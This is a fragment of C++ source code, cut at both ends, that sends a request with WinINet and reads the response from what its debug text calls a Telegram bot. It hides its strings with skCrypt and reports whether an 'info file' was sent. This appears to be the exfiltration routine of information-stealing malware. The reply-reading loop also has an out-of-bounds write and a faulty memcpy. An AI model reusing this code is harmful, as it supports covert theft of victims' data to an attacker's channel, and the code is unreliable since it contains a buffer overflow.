
    if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.size()))
        goto cleanup;

    DWORD received;
    BYTE buf[1024];
    while (InternetReadFile(hrequest, buf, sizeof(buf), &received) && received) {
        buf[received] = 0;
        char str[sizeof(buf) + 1];
        memcpy(str, buf, sizeof(buf));
        str[sizeof(buf)] = 0;
        filesLink.push_back(str);
        Json data = Json::parse(str);
        if (!data[(string)skCrypt("ok")] && DEBUG)
            cout << skCrypt("Info file not sent via telegram bot") << endl;
    }


cleanup:
    if (hsession)
        InternetCloseHandle(hsession);
    if (hconnect)
        InternetCloseHandle(hconnect);
    if (hrequest)
        InternetCloseHandle(hrequest);
}
